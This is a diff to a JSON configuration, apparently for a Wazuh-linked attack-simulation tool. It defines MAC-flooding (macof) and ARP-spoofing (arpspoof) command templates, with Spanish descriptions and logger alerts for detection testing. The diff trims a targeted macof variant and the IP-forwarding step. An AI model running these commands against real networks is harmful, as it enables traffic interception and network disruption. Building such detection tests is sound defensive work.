@@ -8,7 +8,6 @@
     "wazuh_rule_id": 100500,
     "description": "Satura la tabla CAM del switch enviando MACs falsas para forzar modo hub y exponer el tráfico de red completo del segmento.",
     "command": "sudo macof -i {{interface}} -n {{count}}",
-    "command_alt": "sudo macof -i {{interface}} -d {{target_ip}}",
     "parameters": [
       {
         "name": "interface",
@@ -26,15 +25,6 @@
         "default": 5000,
         "required": true,
         "placeholder": "5000"
-      },
-      {
-        "name": "target_ip",
-        "label": "IP destino (opcional)",
-        "type": "text",
-        "default": "",
-        "required": false,
-        "placeholder": "192.168.1.1",
-        "hint": "Dejar vacío para inundación genérica"
       }
     ],
     "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: MAC Flooding detected on Port 1 - Interface {{interface}} - {{count}} packets sent - CAM Table Overflow confirmed - MITRE:T1557\""
@@ -153,7 +143,7 @@
     "risk_level": "CRITICAL",
     "wazuh_rule_id": 100504,
     "description": "Intercepta tráfico entre víctima y gateway activando IP forwarding para MitM silencioso bidireccional.",
-    "command": "sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward && arpspoof -i {{interface}} -t {{target}} {{gateway}}'",
+    "command": "sudo arpspoof -i {{interface}} -t {{target}} {{gateway}}",
     "parameters": [
       {
         "name": "interface",
